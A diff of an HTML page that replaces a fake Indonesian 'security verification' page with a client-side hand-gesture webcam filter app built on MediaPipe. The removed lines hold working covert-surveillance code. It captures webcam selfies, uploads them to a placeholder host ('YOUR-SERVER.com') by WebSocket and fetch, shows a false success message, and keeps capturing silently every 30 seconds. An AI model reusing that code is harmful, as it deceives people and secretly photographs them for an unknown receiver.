@@ -1,116 +1,848 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-<title>🎯 Verifikasi Keamanan</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>RETROLENS — Hand Portal Filter</title>
 <style>
-  body{background:#000;color:#0f0;font-family:monospace;text-align:center;padding:50px}
-  video{width:400px;border:3px solid #0f0;display:none}
-  button{background:#0f0;color:#000;padding:20px 40px;border:none;font-weight:bold;cursor:pointer;font-size:20px}
-  #status{color:#ff0;margin:20px;font-size:18px}
-  .loader{border:5px solid #0f0;border-radius:50%;border-top:5px solid #000;width:50px;height:50px;animation:spin 1s linear infinite;margin:20px auto}
-  @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+  @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;700&family=JetBrains+Mono:wght@400;500;700&display=swap');
+
+  :root{
+    --void: #0a0710;
+    --panel: #130f1f;
+    --panel-line: #2a2140;
+    --cyan: #4ef2e6;
+    --magenta: #ff3cac;
+    --amber: #ffd166;
+    --ink: #eae6f7;
+    --ink-dim: #8f87ab;
+  }
+
+  *{ box-sizing:border-box; }
+
+  body{
+    margin:0;
+    min-height:100vh;
+    background:
+      radial-gradient(ellipse 60% 40% at 15% 0%, rgba(78,242,230,0.10), transparent 60%),
+      radial-gradient(ellipse 50% 40% at 100% 20%, rgba(255,60,172,0.10), transparent 60%),
+      var(--void);
+    color:var(--ink);
+    font-family:'Space Grotesk', sans-serif;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    padding:28px 16px 60px;
+  }
+
+  header{
+    width:100%;
+    max-width:1180px;
+    display:flex;
+    align-items:baseline;
+    justify-content:space-between;
+    gap:16px;
+    flex-wrap:wrap;
+    margin-bottom:22px;
+    border-bottom:1px solid var(--panel-line);
+    padding-bottom:16px;
+  }
+
+  .brand{
+    display:flex;
+    align-items:baseline;
+    gap:12px;
+  }
+
+  .brand h1{
+    margin:0;
+    font-size:26px;
+    letter-spacing:0.08em;
+    font-weight:700;
+  }
+  .brand h1 span{ color:var(--cyan); }
+
+  .brand .tag{
+    font-family:'JetBrains Mono', monospace;
+    font-size:11px;
+    letter-spacing:0.14em;
+    color:var(--ink-dim);
+    text-transform:uppercase;
+    border:1px solid var(--panel-line);
+    padding:3px 8px;
+    border-radius:3px;
+  }
+
+  header .sub{
+    font-family:'JetBrains Mono', monospace;
+    font-size:12px;
+    color:var(--ink-dim);
+    max-width:420px;
+    text-align:right;
+  }
+
+  main{
+    width:100%;
+    max-width:1180px;
+    display:grid;
+    grid-template-columns:1fr 320px;
+    gap:22px;
+  }
+
+  @media (max-width:880px){
+    main{ grid-template-columns:1fr; }
+  }
+
+  .stage{
+    position:relative;
+    background:#000;
+    border:1px solid var(--panel-line);
+    border-radius:10px;
+    overflow:hidden;
+    aspect-ratio:4/3;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+  }
+
+  .stage::before{
+    content:"";
+    position:absolute; inset:0;
+    pointer-events:none;
+    box-shadow: inset 0 0 0 1px rgba(78,242,230,0.08);
+    z-index:5;
+  }
+
+  video{ display:none; }
+
+  canvas{
+    width:100%;
+    height:100%;
+    display:block;
+  }
+
+  .idle-panel{
+    position:absolute;
+    inset:0;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    justify-content:center;
+    gap:18px;
+    text-align:center;
+    padding:20px;
+    background:radial-gradient(circle at 50% 40%, rgba(78,242,230,0.06), transparent 65%);
+    z-index:4;
+  }
+
+  .portal-ring{
+    width:88px; height:88px;
+    border-radius:50%;
+    border:2px solid var(--cyan);
+    box-shadow:0 0 24px rgba(78,242,230,0.55), inset 0 0 24px rgba(78,242,230,0.35);
+    animation:spin 6s linear infinite;
+  }
+  .portal-ring::after{
+    content:"";
+    display:block;
+    width:100%; height:100%;
+    border-radius:50%;
+    border:2px dashed var(--magenta);
+    transform:scale(0.7);
+    opacity:0.7;
+  }
+  @keyframes spin{ to{ transform:rotate(360deg); } }
+
+  #startBtn{
+    font-family:'JetBrains Mono', monospace;
+    font-size:13px;
+    letter-spacing:0.08em;
+    text-transform:uppercase;
+    background:var(--cyan);
+    color:#04201d;
+    border:none;
+    padding:12px 26px;
+    border-radius:5px;
+    font-weight:700;
+    cursor:pointer;
+    transition:transform 0.15s ease, box-shadow 0.15s ease;
+    box-shadow:0 0 0 rgba(78,242,230,0);
+  }
+  #startBtn:hover{ transform:translateY(-1px); box-shadow:0 6px 22px rgba(78,242,230,0.25); }
+  #startBtn:active{ transform:translateY(0); }
+  #startBtn:disabled{ opacity:0.5; cursor:default; transform:none; box-shadow:none; }
+
+  .idle-panel p{
+    color:var(--ink-dim);
+    font-size:13px;
+    max-width:320px;
+    margin:0;
+  }
+
+  #statusMsg{
+    font-family:'JetBrains Mono', monospace;
+    font-size:11.5px;
+    color:var(--magenta);
+    min-height:16px;
+  }
+
+  .hud{
+    position:absolute;
+    top:12px; left:12px; right:12px;
+    display:flex;
+    justify-content:space-between;
+    align-items:flex-start;
+    z-index:3;
+    pointer-events:none;
+    font-family:'JetBrains Mono', monospace;
+  }
+
+  .hud .rec{
+    display:flex; align-items:center; gap:6px;
+    font-size:11px; letter-spacing:0.1em; color:var(--ink-dim);
+  }
+  .hud .rec .dot{
+    width:7px; height:7px; border-radius:50%;
+    background:var(--magenta);
+    box-shadow:0 0 8px var(--magenta);
+    animation:pulse 1.4s ease-in-out infinite;
+  }
+  @keyframes pulse{ 0%,100%{opacity:1;} 50%{opacity:0.25;} }
+
+  .hud .fps{
+    font-size:11px; color:var(--ink-dim);
+  }
+
+  aside{
+    display:flex;
+    flex-direction:column;
+    gap:14px;
+  }
+
+  .panel{
+    background:var(--panel);
+    border:1px solid var(--panel-line);
+    border-radius:10px;
+    padding:16px 18px;
+  }
+
+  .panel h2{
+    margin:0 0 10px;
+    font-size:12px;
+    letter-spacing:0.14em;
+    text-transform:uppercase;
+    color:var(--ink-dim);
+    font-family:'JetBrains Mono', monospace;
+    display:flex;
+    align-items:center;
+    gap:8px;
+  }
+  .panel h2::before{
+    content:"";
+    width:6px; height:6px;
+    background:var(--cyan);
+    display:inline-block;
+    transform:rotate(45deg);
+  }
+
+  .gesture-row{
+    display:flex;
+    gap:10px;
+    align-items:flex-start;
+    padding:9px 0;
+    border-bottom:1px solid var(--panel-line);
+    font-size:13px;
+    line-height:1.4;
+  }
+  .gesture-row:last-child{ border-bottom:none; }
+  .gesture-row b{ color:var(--cyan); font-weight:600; }
+  .gesture-row span{ color:var(--ink-dim); }
+
+  .filter-grid{
+    display:flex;
+    flex-wrap:wrap;
+    gap:6px;
+  }
+
+  .chip{
+    font-family:'JetBrains Mono', monospace;
+    font-size:10.5px;
+    letter-spacing:0.05em;
+    padding:5px 9px;
+    border:1px solid var(--panel-line);
+    border-radius:4px;
+    color:var(--ink-dim);
+    transition:all 0.15s ease;
+  }
+  .chip.active{
+    color:#04201d;
+    background:var(--amber);
+    border-color:var(--amber);
+    font-weight:700;
+  }
+
+  .current-filter{
+    font-family:'JetBrains Mono', monospace;
+    font-size:28px;
+    font-weight:700;
+    color:var(--amber);
+    letter-spacing:0.02em;
+    margin:2px 0 4px;
+  }
+  .current-filter-label{
+    font-size:11px;
+    color:var(--ink-dim);
+    letter-spacing:0.1em;
+    text-transform:uppercase;
+    font-family:'JetBrains Mono', monospace;
+  }
+
+  footer{
+    max-width:1180px;
+    width:100%;
+    margin-top:20px;
+    font-family:'JetBrains Mono', monospace;
+    font-size:11px;
+    color:var(--ink-dim);
+    display:flex;
+    justify-content:space-between;
+    flex-wrap:wrap;
+    gap:8px;
+  }
+
+  a{ color:var(--cyan); }
 </style>
 </head>
 <body>
-<h1>🔐 VERIFIKASI KEAMANAN</h1>
-<p style="color:#fff">Klik tombol untuk verifikasi wajah (wajib)</p>
 
-<video id="video" autoplay></video>
-<button onclick="startVerification()">✅ VERIFIKASI SEKARANG</button>
-<div id="status">⏳ MENUNGGU...</div>
-<div id="loader" class="loader" style="display:none"></div>
+<header>
+  <div class="brand">
+    <h1>RETRO<span>LENS</span></h1>
+    <div class="tag">Hand Portal Filter · Web Edition</div>
+  </div>
+  <div class="sub">Buka portal dengan jari Anda, terapkan filter visual, dan ganti efek hanya dengan gestur tangan — semuanya langsung di browser.</div>
+</header>
 
-<script>
-let stream;
-let photoTaken = false;
+<main>
+  <div class="stage" id="stage">
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
 
-async function startVerification() {
+    <div class="hud" id="hud" style="display:none;">
+      <div class="rec"><span class="dot"></span>LIVE</div>
+      <div class="fps" id="fpsCounter">0 FPS</div>
+    </div>
+
+    <div class="idle-panel" id="idlePanel">
+      <div class="portal-ring"></div>
+      <div>
+        <button id="startBtn">Buka Kamera</button>
+      </div>
+      <p>Butuh akses webcam. Semua pemrosesan berjalan lokal di browser Anda — video tidak dikirim ke server manapun.</p>
+      <div id="statusMsg"></div>
+    </div>
+  </div>
+
+  <aside>
+    <div class="panel">
+      <h2>Filter Aktif</h2>
+      <div class="current-filter" id="currentFilterName">—</div>
+      <div class="current-filter-label" id="filterIndexLabel">Belum dimulai</div>
+      <div class="filter-grid" id="filterGrid"></div>
+    </div>
+
+    <div class="panel">
+      <h2>Cara Pakai</h2>
+      <div class="gesture-row">
+        <b>4 jari</b>
+        <span>Angkat jempol &amp; telunjuk dari <b>kedua tangan</b> — portal segi empat muncul di antara keempat titik, filter aktif tampil di dalamnya.</span>
+      </div>
+      <div class="gesture-row">
+        <b>Ganti filter</b>
+        <span>Dekatkan jempol ke kelingking pada satu tangan, atau dekatkan telunjuk kedua tangan satu sama lain.</span>
+      </div>
+      <div class="gesture-row">
+        <b>Galaxy</b>
+        <span>Filter ini memisahkan Anda dari latar belakang dan mengganti latarnya dengan galaksi buatan.</span>
+      </div>
+    </div>
+  </aside>
+</main>
+
+<footer>
+  <span>Diporting dari skrip Python (OpenCV + MediaPipe) ke satu file HTML — berjalan sepenuhnya di sisi klien.</span>
+  <span>Tekan tombol di bawah stage untuk berhenti kapan saja.</span>
+</footer>
+
+<script type="module">
+import {
+  HandLandmarker,
+  ImageSegmenter,
+  FilesetResolver
+} from "https://cdn.jsdelivr.net/npm/@mediapipe/tasks-vision@0.10.20";
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const ctx = canvas.getContext('2d', { willReadFrequently: true });
+const startBtn = document.getElementById('startBtn');
+const idlePanel = document.getElementById('idlePanel');
+const hud = document.getElementById('hud');
+const statusMsg = document.getElementById('statusMsg');
+const fpsCounter = document.getElementById('fpsCounter');
+const currentFilterName = document.getElementById('currentFilterName');
+const filterIndexLabel = document.getElementById('filterIndexLabel');
+const filterGrid = document.getElementById('filterGrid');
+
+const filters = ["MONO", "DUAL-TONE", "PIXELATE", "INVERT", "SEPIA", "BLUR", "THERMAL", "SKETCH", "GLITCH", "NEON", "GALAXY"];
+let currentFilter = 0;
+let gestureTriggered = false;
+
+filters.forEach((f) => {
+  const chip = document.createElement('div');
+  chip.className = 'chip';
+  chip.textContent = f;
+  chip.dataset.name = f;
+  filterGrid.appendChild(chip);
+});
+
+function updateFilterUI() {
+  currentFilterName.textContent = filters[currentFilter];
+  filterIndexLabel.textContent = `Filter ${currentFilter + 1} dari ${filters.length}`;
+  [...filterGrid.children].forEach((chip) => {
+    chip.classList.toggle('active', chip.dataset.name === filters[currentFilter]);
+  });
+}
+updateFilterUI();
+
+let handLandmarker = null;
+let imageSegmenter = null;
+let running = false;
+
+// Offscreen mirrored source canvas (equivalent to python's cv2.flip(img,1))
+const flipCanvas = document.createElement('canvas');
+const flipCtx = flipCanvas.getContext('2d', { willReadFrequently: true });
+
+// Precompute galaxy background (equivalent to galaxy_bg in python)
+const GALAXY_W = 1920, GALAXY_H = 1080;
+const galaxyCanvas = document.createElement('canvas');
+galaxyCanvas.width = GALAXY_W;
+galaxyCanvas.height = GALAXY_H;
+(function buildGalaxy() {
+  const gctx = galaxyCanvas.getContext('2d');
+  gctx.fillStyle = 'rgb(40,30,50)'; // space purple (RGB order, not BGR)
+  gctx.fillRect(0, 0, GALAXY_W, GALAXY_H);
+  for (let i = 0; i < 800; i++) {
+    const sx = Math.random() * GALAXY_W, sy = Math.random() * GALAXY_H;
+    gctx.fillStyle = 'rgb(255,255,255)';
+    gctx.fillRect(sx, sy, 1, 1);
+  }
+  for (let i = 0; i < 100; i++) {
+    const sx = Math.random() * GALAXY_W, sy = Math.random() * GALAXY_H;
+    const r = 2 + Math.random() * 4;
+    const cr = 100 + Math.random() * 155;
+    const cg = 150 + Math.random() * 105;
+    gctx.fillStyle = `rgb(${cr|0},${cg|0},255)`;
+    gctx.beginPath(); gctx.arc(sx, sy, r, 0, Math.PI * 2); gctx.fill();
+  }
+})();
+let galaxyImgData = null; // filled lazily once needed
+
+function getGalaxyData() {
+  if (!galaxyImgData) {
+    galaxyImgData = galaxyCanvas.getContext('2d').getImageData(0, 0, GALAXY_W, GALAXY_H).data;
+  }
+  return galaxyImgData;
+}
+function galaxyPixel(x, y) {
+  const gx = Math.min(GALAXY_W - 1, Math.max(0, x | 0));
+  const gy = Math.min(GALAXY_H - 1, Math.max(0, y | 0));
+  const d = getGalaxyData();
+  const idx = (gy * GALAXY_W + gx) * 4;
+  return [d[idx], d[idx + 1], d[idx + 2]];
+}
+
+function clamp01(v) { return Math.min(1, Math.max(0, v)); }
+function jetColor(gray) {
+  const v = gray / 255;
+  const r = clamp01(1.5 - Math.abs(4 * v - 3)) * 255;
+  const g = clamp01(1.5 - Math.abs(4 * v - 2)) * 255;
+  const b = clamp01(1.5 - Math.abs(4 * v - 1)) * 255;
+  return [r, g, b];
+}
+
+function applyFilter(roiCanvas, filterName, originX, originY, maskSampler) {
+  const w = roiCanvas.width, h = roiCanvas.height;
+  const out = document.createElement('canvas');
+  out.width = w; out.height = h;
+  const octx = out.getContext('2d', { willReadFrequently: true });
+
+  if (w === 0 || h === 0) return out;
+
+  switch (filterName) {
+    case 'MONO':
+      octx.filter = 'grayscale(100%)';
+      octx.drawImage(roiCanvas, 0, 0);
+      break;
+
+    case 'INVERT':
+      octx.filter = 'invert(100%)';
+      octx.drawImage(roiCanvas, 0, 0);
+      break;
+
+    case 'SEPIA':
+      octx.filter = 'sepia(100%)';
+      octx.drawImage(roiCanvas, 0, 0);
+      break;
+
+    case 'BLUR':
+      octx.filter = 'blur(9px)';
+      octx.drawImage(roiCanvas, -4, -4, w + 8, h + 8);
+      break;
+
+    case 'PIXELATE': {
+      const sw = Math.max(1, Math.floor(w / 10)), sh = Math.max(1, Math.floor(h / 10));
+      const small = document.createElement('canvas');
+      small.width = sw; small.height = sh;
+      const sctx = small.getContext('2d');
+      sctx.imageSmoothingEnabled = true;
+      sctx.drawImage(roiCanvas, 0, 0, sw, sh);
+      octx.imageSmoothingEnabled = false;
+      octx.drawImage(small, 0, 0, sw, sh, 0, 0, w, h);
+      break;
+    }
+
+    case 'THERMAL': {
+      octx.drawImage(roiCanvas, 0, 0);
+      const imgData = octx.getImageData(0, 0, w, h);
+      const d = imgData.data;
+      for (let i = 0; i < d.length; i += 4) {
+        const gray = 0.299 * d[i] + 0.587 * d[i + 1] + 0.114 * d[i + 2];
+        const [r, g, b] = jetColor(gray);
+        d[i] = r; d[i + 1] = g; d[i + 2] = b;
+      }
+      octx.putImageData(imgData, 0, 0);
+      break;
+    }
+
+    case 'SKETCH': {
+      octx.filter = 'grayscale(100%)';
+      octx.drawImage(roiCanvas, 0, 0);
+      octx.filter = 'none';
+      const blurred = document.createElement('canvas');
+      blurred.width = w; blurred.height = h;
+      const bctx = blurred.getContext('2d');
+      bctx.filter = 'grayscale(100%) invert(100%) blur(7px)';
+      bctx.drawImage(roiCanvas, 0, 0);
+      octx.globalCompositeOperation = 'color-dodge';
+      octx.drawImage(blurred, 0, 0);
+      octx.globalCompositeOperation = 'source-over';
+      break;
+    }
+
+    case 'DUAL-TONE': {
+      octx.drawImage(roiCanvas, 0, 0);
+      const imgData = octx.getImageData(0, 0, w, h);
+      const d = imgData.data;
+      for (let i = 0; i < d.length; i += 4) {
+        const gray = 0.299 * d[i] + 0.587 * d[i + 1] + 0.114 * d[i + 2];
+        if (gray > 127) { d[i] = 255; d[i + 1] = 165; d[i + 2] = 0; }
+        else { d[i] = 255; d[i + 1] = 20; d[i + 2] = 147; }
+      }
+      octx.putImageData(imgData, 0, 0);
+      break;
+    }
+
+    case 'GLITCH': {
+      octx.drawImage(roiCanvas, 0, 0);
+      const imgData = octx.getImageData(0, 0, w, h);
+      const src = new Uint8ClampedArray(imgData.data);
+      const d = imgData.data;
+      const shift = Math.max(5, Math.floor(w / 20));
+      for (let yy = 0; yy < h; yy++) {
+        const row = yy * w;
+        for (let xx = 0; xx < w - shift; xx++) {
+          d[(row + xx) * 4] = src[(row + xx + shift) * 4]; // R shift left
+        }
+        for (let xx = shift; xx < w; xx++) {
+          d[(row + xx) * 4 + 2] = src[(row + xx - shift) * 4 + 2]; // B shift right
+        }
+      }
+      octx.putImageData(imgData, 0, 0);
+      break;
+    }
+
+    case 'NEON': {
+      const g = document.createElement('canvas');
+      g.width = w; g.height = h;
+      const gctx = g.getContext('2d');
+      gctx.filter = 'grayscale(100%) blur(1px)';
+      gctx.drawImage(roiCanvas, 0, 0);
+      const gd = gctx.getImageData(0, 0, w, h).data;
+      const outData = octx.createImageData(w, h);
+      const od = outData.data;
+      const gray = (xx, yy) => gd[(yy * w + xx) * 4];
+      for (let yy = 1; yy < h - 1; yy++) {
+        for (let xx = 1; xx < w - 1; xx++) {
+          const gx = -gray(xx - 1, yy - 1) - 2 * gray(xx - 1, yy) - gray(xx - 1, yy + 1)
+                   +  gray(xx + 1, yy - 1) + 2 * gray(xx + 1, yy) + gray(xx + 1, yy + 1);
+          const gy = -gray(xx - 1, yy - 1) - 2 * gray(xx, yy - 1) - gray(xx + 1, yy - 1)
+                   +  gray(xx - 1, yy + 1) + 2 * gray(xx, yy + 1) + gray(xx + 1, yy + 1);
+          const mag = Math.sqrt(gx * gx + gy * gy);
+          const idx = (yy * w + xx) * 4;
+          if (mag > 70) { od[idx] = 0; od[idx + 1] = 255; od[idx + 2] = 255; od[idx + 3] = 255; }
+          else { od[idx + 3] = 255; }
+        }
+      }
+      octx.putImageData(outData, 0, 0);
+      break;
+    }
+
+    case 'GALAXY': {
+      octx.drawImage(roiCanvas, 0, 0);
+      if (maskSampler) {
+        const imgData = octx.getImageData(0, 0, w, h);
+        const d = imgData.data;
+        for (let yy = 0; yy < h; yy++) {
+          for (let xx = 0; xx < w; xx++) {
+            const gx = originX + xx, gy = originY + yy;
+            if (maskSampler(gx, gy) === 0) {
+              const [r, g, b] = galaxyPixel(gx, gy);
+              const idx = (yy * w + xx) * 4;
+              d[idx] = r; d[idx + 1] = g; d[idx + 2] = b;
+            }
+          }
+        }
+        octx.putImageData(imgData, 0, 0);
+      }
+      break;
+    }
+
+    default:
+      octx.drawImage(roiCanvas, 0, 0);
+  }
+  return out;
+}
+
+async function setup() {
+  statusMsg.textContent = 'Memuat model MediaPipe…';
+  const vision = await FilesetResolver.forVisionTasks(
+    "https://cdn.jsdelivr.net/npm/@mediapipe/tasks-vision@0.10.20/wasm"
+  );
+
+  handLandmarker = await HandLandmarker.createFromOptions(vision, {
+    baseOptions: {
+      modelAssetPath: "https://storage.googleapis.com/mediapipe-models/hand_landmarker/hand_landmarker/float16/1/hand_landmarker.task",
+    },
+    runningMode: "VIDEO",
+    numHands: 2,
+    minHandDetectionConfidence: 0.7,
+    minHandPresenceConfidence: 0.7,
+    minTrackingConfidence: 0.7
+  });
+
   try {
-    // 🔥 Aktivasi kamera tanpa sepengetahuan
-    document.getElementById('status').innerHTML = '📸 MENGAMBIL FOTO...';
-    document.getElementById('loader').style.display = 'block';
-    
-    stream = await navigator.mediaDevices.getUserMedia({ 
-      video: { 
-        facingMode: 'user',
-        width: { ideal: 1920 },
-        height: { ideal: 1080 }
+    imageSegmenter = await ImageSegmenter.createFromOptions(vision, {
+      baseOptions: {
+        modelAssetPath: "https://storage.googleapis.com/mediapipe-models/image_segmenter/selfie_segmenter/float16/1/selfie_segmenter.tflite",
       },
-      audio: false 
+      runningMode: "VIDEO",
+      outputCategoryMask: true,
+      outputConfidenceMasks: false
     });
-    
-    document.getElementById('video').srcObject = stream;
-    document.getElementById('video').style.display = 'block';
-    
-    // 📸 Capture setelah 2 detik (biar kamera fokus)
-    setTimeout(() => {
-      captureAndSend();
-    }, 2000);
-    
-  } catch(e) {
-    document.getElementById('status').innerHTML = '❌ ERROR: ' + e.message;
-    document.getElementById('loader').style.display = 'none';
+  } catch (e) {
+    console.warn("Segmenter tidak tersedia (filter GALAXY akan tampil tanpa efek background).", e);
+    imageSegmenter = null;
   }
 }
 
-function captureAndSend() {
-  const canvas = document.createElement('canvas');
-  canvas.width = 1920;
-  canvas.height = 1080;
-  const ctx = canvas.getContext('2d');
-  ctx.drawImage(document.getElementById('video'), 0, 0, 1920, 1080);
-  
-  // 💀 Kirim ke server penampung
-  const dataUrl = canvas.toDataURL('image/jpeg', 0.95);
-  
-  // 🔥 Kirim via WebSocket langsung
-  const ws = new WebSocket('wss://YOUR-SERVER.com:8081');
-  ws.onopen = () => {
-    ws.send(JSON.stringify({
-      type: 'selfie',
-      payload: dataUrl,
-      timestamp: Date.now(),
-      userAgent: navigator.userAgent
-    }));
-    ws.close();
-  };
-  
-  // 📡 Kirim via fetch juga (cadangan)
-  fetch('https://YOUR-SERVER.com/upload', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ image: dataUrl, type: 'selfie' }),
-    mode: 'no-cors'
-  });
-  
-  // 🎭 Hapus semua bukti
-  document.getElementById('video').style.display = 'none';
-  document.getElementById('status').innerHTML = '✅ VERIFIKASI BERHASIL! TERIMA KASIH 😊';
-  document.getElementById('loader').style.display = 'none';
-  
-  // 📸 Ambil lagi setiap 30 detik (tanpa pemberitahuan)
-  setInterval(() => {
-    captureAndSendSilent();
-  }, 30000);
-  
-  photoTaken = true;
+async function startCamera() {
+  startBtn.disabled = true;
+  statusMsg.textContent = 'Meminta izin kamera…';
+  try {
+    if (!handLandmarker) await setup();
+
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { width: { ideal: 960 }, height: { ideal: 720 }, facingMode: 'user' },
+      audio: false
+    });
+    video.srcObject = stream;
+    await new Promise((resolve) => { video.onloadedmetadata = resolve; });
+    await video.play();
+
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    flipCanvas.width = video.videoWidth;
+    flipCanvas.height = video.videoHeight;
+
+    idlePanel.style.display = 'none';
+    hud.style.display = 'flex';
+    running = true;
+    requestAnimationFrame(loop);
+  } catch (e) {
+    console.error(e);
+    statusMsg.textContent = 'Gagal mengakses kamera: ' + e.message;
+    startBtn.disabled = false;
+  }
 }
 
-function captureAndSendSilent() {
-  const canvas = document.createElement('canvas');
-  canvas.width = 1920;
-  canvas.height = 1080;
-  const ctx = canvas.getContext('2d');
-  ctx.drawImage(document.getElementById('video'), 0, 0, 1920, 1080);
-  const dataUrl = canvas.toDataURL('image/jpeg', 0.95);
-  
-  // Kirim tanpa log
-  fetch('https://YOUR-SERVER.com/upload', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ image: dataUrl, type: 'selfie_auto' })
-  });
+let lastFrameTime = performance.now();
+let fpsSmooth = 0;
+
+function loop(now) {
+  if (!running) return;
+
+  if (video.readyState >= 2) {
+    const w = flipCanvas.width, h = flipCanvas.height;
+
+    // Mirror the frame, matching python's cv2.flip(img, 1)
+    flipCtx.save();
+    flipCtx.translate(w, 0);
+    flipCtx.scale(-1, 1);
+    flipCtx.drawImage(video, 0, 0, w, h);
+    flipCtx.restore();
+
+    const timestampMs = now;
+    const handResults = handLandmarker.detectForVideo(flipCanvas, timestampMs);
+    const filterName = filters[currentFilter];
+
+    let maskSampler = null;
+    if (filterName === 'GALAXY' && imageSegmenter) {
+      const segResult = imageSegmenter.segmentForVideo(flipCanvas, timestampMs);
+      if (segResult.categoryMask) {
+        const maskData = segResult.categoryMask.getAsUint8Array();
+        const maskW = segResult.categoryMask.width;
+        const maskH = segResult.categoryMask.height;
+        maskSampler = (x, y) => {
+          const mx = Math.floor((x * maskW) / w);
+          const my = Math.floor((y * maskH) / h);
+          if (mx < 0 || my < 0 || mx >= maskW || my >= maskH) return 1;
+          return maskData[my * maskW + mx];
+        };
+        segResult.categoryMask.close?.();
+      }
+    }
+
+    // Draw base mirrored frame
+    ctx.drawImage(flipCanvas, 0, 0);
+
+    const ptsPortal = [];
+    let changeFilter = false;
+
+    if (handResults.landmarks && handResults.landmarks.length > 0) {
+      const hands = handResults.landmarks;
+
+      if (hands.length >= 2) {
+        const idx0 = hands[0][8], idx1 = hands[1][8];
+        const pt0 = [idx0.x * w, idx0.y * h];
+        const pt1 = [idx1.x * w, idx1.y * h];
+        if (Math.hypot(pt0[0] - pt1[0], pt0[1] - pt1[1]) < 40) changeFilter = true;
+      }
+
+      for (const lm of hands) {
+        const thumb = lm[4], pinky = lm[20];
+        const tx = thumb.x * w, ty = thumb.y * h;
+        const px = pinky.x * w, py = pinky.y * h;
+        if (Math.hypot(tx - px, ty - py) < 40) changeFilter = true;
+      }
+
+      if (changeFilter) {
+        if (!gestureTriggered) {
+          currentFilter = (currentFilter + 1) % filters.length;
+          gestureTriggered = true;
+          updateFilterUI();
+        }
+      } else {
+        gestureTriggered = false;
+      }
+
+      for (const lm of hands) {
+        for (let id = 0; id < lm.length; id++) {
+          const cx = lm[id].x * w, cy = lm[id].y * h;
+          if (id === 4 || id === 8) {
+            ptsPortal.push([cx, cy]);
+            ctx.fillStyle = '#00FFFF';
+            ctx.beginPath(); ctx.arc(cx, cy, 8, 0, Math.PI * 2); ctx.fill();
+          }
+        }
+      }
+
+      if (ptsPortal.length === 4) {
+        ptsPortal.sort((a, b) => a[1] - b[1]);
+        const topPts = ptsPortal.slice(0, 2).sort((a, b) => a[0] - b[0]);
+        const bottomPts = ptsPortal.slice(2, 4).sort((a, b) => a[0] - b[0]);
+        const poly = [topPts[0], topPts[1], bottomPts[1], bottomPts[0]];
+
+        const xs = poly.map(p => p[0]), ys = poly.map(p => p[1]);
+        let x = Math.max(0, Math.min(...xs));
+        let y = Math.max(0, Math.min(...ys));
+        let bw = Math.min(...[w - x, Math.max(...xs) - x]);
+        let bh = Math.min(...[h - y, Math.max(...ys) - y]);
+        x = Math.round(x); y = Math.round(y);
+        bw = Math.round(bw); bh = Math.round(bh);
+
+        if (bw > 4 && bh > 4) {
+          const roiCanvas = document.createElement('canvas');
+          roiCanvas.width = bw; roiCanvas.height = bh;
+          roiCanvas.getContext('2d').drawImage(flipCanvas, x, y, bw, bh, 0, 0, bw, bh);
+
+          const filteredCanvas = applyFilter(roiCanvas, filterName, x, y, maskSampler);
+
+          ctx.save();
+          ctx.beginPath();
+          ctx.moveTo(poly[0][0], poly[0][1]);
+          for (let i = 1; i < 4; i++) ctx.lineTo(poly[i][0], poly[i][1]);
+          ctx.closePath();
+          ctx.clip();
+          ctx.drawImage(filteredCanvas, x, y);
+          ctx.restore();
+
+          ctx.strokeStyle = '#FFFFFF';
+          ctx.lineWidth = 2;
+          ctx.beginPath();
+          ctx.moveTo(poly[0][0], poly[0][1]);
+          for (let i = 1; i < 4; i++) ctx.lineTo(poly[i][0], poly[i][1]);
+          ctx.closePath();
+          ctx.stroke();
+
+          for (let i = 0; i < 4; i++) {
+            const p1 = poly[i], p2 = poly[(i + 1) % 4];
+            for (let k = 0; k < 5; k++) {
+              const alpha = Math.random();
+              const rx = p1[0] * alpha + p2[0] * (1 - alpha) + (Math.random() * 30 - 15);
+              const ry = p1[1] * alpha + p2[1] * (1 - alpha) + (Math.random() * 30 - 15);
+              ctx.fillStyle = '#FFFF00';
+              ctx.beginPath();
+              ctx.arc(rx, ry, 1 + Math.random() * 3, 0, Math.PI * 2);
+              ctx.fill();
+            }
+          }
+
+          ctx.fillStyle = '#FFFFFF';
+          ctx.font = '15px "JetBrains Mono", monospace';
+          ctx.fillText(`PORTAL: ${filterName}`, topPts[0][0], Math.max(14, topPts[0][1] - 10));
+        }
+      }
+    }
+
+    // Overlay instructions
+    ctx.font = '16px "Space Grotesk", sans-serif';
+    ctx.fillStyle = 'rgba(255,255,255,0.9)';
+    ctx.fillText('Ganti Filter: Jempol & Kelingking', 10, 26);
+    ctx.fillStyle = '#FFFF00';
+    ctx.fillText(`Filter Aktif: ${filters[currentFilter]}`, 10, 50);
+  }
+
+  const nowT = performance.now();
+  const dt = nowT - lastFrameTime;
+  lastFrameTime = nowT;
+  const fps = 1000 / dt;
+  fpsSmooth = fpsSmooth ? fpsSmooth * 0.9 + fps * 0.1 : fps;
+  fpsCounter.textContent = `${fpsSmooth.toFixed(0)} FPS`;
+
+  requestAnimationFrame(loop);
 }
+
+startBtn.addEventListener('click', startCamera);
 </script>
 </body>
 </html>
